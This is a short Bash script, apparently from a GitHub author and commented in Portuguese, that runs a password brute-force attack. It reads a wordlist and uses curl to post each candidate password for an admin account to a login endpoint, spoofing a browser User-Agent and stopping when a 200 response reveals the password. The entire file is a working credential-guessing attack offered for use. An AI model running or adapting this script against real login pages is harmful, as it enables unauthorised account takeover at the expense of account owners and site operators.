#!/bin/bash
########################################################################################
# Script Name: brute_force.sh
# Description: Ataque de força bruta utilizando curl
# Author: https://github.com/kahledrahaus
# Date: 31/10/2022
# Dependencies: curl
# Encode: UTF8
########################################################################################

senhas=$(cat ./best1050.txt) # Troque por sua wordlist favorita
array_senhas=($senhas)
clear

for senha in ${array_senhas[@]}; do
    echo -e "\t***** ATAQUE DE FORÇA BRUTA *****"
    status=$(curl -X POST 'https://example.com/rest/user/login' \
        -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0" \
        -H "Content-Type: application/json" \
        --data-raw '{"email":"admin@example.com","password":"'$senha'"}' \
        --compressed \
        -m 2 -o /dev/null -s -w "%{http_code}\n")
    if [ $status == 200 ]; then
        echo "Senha encontrada: $senha"
        break
    else
        echo -en "Senha '$senha' inválida - Status: $status"
        sleep 0.2
        clear
    fi
done
